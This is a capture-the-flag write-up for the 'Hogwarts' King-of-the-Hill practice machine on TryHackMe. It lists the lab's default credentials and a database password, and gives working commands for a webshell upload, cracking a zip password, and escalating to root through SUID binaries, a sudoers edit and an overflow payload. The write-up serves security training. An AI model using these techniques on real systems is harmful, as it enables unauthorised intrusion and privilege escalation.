# Hogwarts THM PublicWriteup
#### IMPORTANT Hogwarts has random, moving ports like the stairs moving:

- All ports on this machine are random, except 22. 
- The creds for encrypted files, users and random paths are all random too.


#### Map of services not ports! Rustscan!

To Get for all
```bash
# REQUIRES RUSTSCAN PORTS CHANGE 
nmap service overview
22 is webserver # hard to access with regular browsers!!
# REQUIRES RUSTSCAN PORTS CHANGE 
```

#### Default Credentials
```
dobby : ilikesocks
draco : slytherin
hermoine
neville
```

#### Network Services to Foothold

Port 22 webshell upload -> `www-data`
```
By browsing `/permissions` the secret path to an upload website can be found. This allows any upload, as long as the content type is set to `application/pdf`. A webshell uploaded this way and accessed via `/uploads/shell.php` will have access as `www-data`.
```

random ftp port -> neville's ssh creds
```bash
wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip 
PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')
unzip -P $PASSWORD file.zip 
ssh_pass=$(cat boot/.pass | grep 'neville:' | cut -d ':' -f 2)

ssh -o StrictHostKeychecking=no neville@hogwarts.thm -p MOVINGSSHPORT
```

random http port -> hermoine ssh creds 
```
login vulnerable to sqli
```

#### Privilege Escalation

```bash
sudo ip netns exec foo bash -c 'echo "neville ALL=(ALL:ALL) ALL" >> /etc/sudoers'
```

`/etc/room_of_requirement` is a suid binary
```bash
{ echo -e "012345678901234567890123\xbe\xba\xfe\xca"; cat; } | /etc/room_of_requirement
```

hermoine `date` SUID can read!

IP SUID
```bash
ip netns add foo
ip netns exec foo /bin/sh -p
```

Draco `easy_install`
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

Random high port requires three deathly hallows (including binary)
```bash
/var/www/mystaticsite/style.cloudflare.css
/var/www/mymainsite/login.css
/etc/room_of_requirement
```
Submitting the three 26 character random phrases as (order doesn't matter) grants a root shell

find SUID
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

#### Flags
```
/root/headmaster.txt
/home/hermoine/special_spell.txt
/home/harry/special_spell.txt
/home/draco/achievements.txt
/var/www/mymainsite/conn.php
mysql db (root:neville_was_chosen), basement db, monsters table
/etc/left_corridor/seventh_floor/.entrance (thanks to mug3njutsu on discord for this)
```
#### References
https://www.cyberguider.com/hogwarts-vulnhub-writeup/
https://github.com/Machinh/Koth-THM/blob/main/HOGWARTS
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-hogwarts.md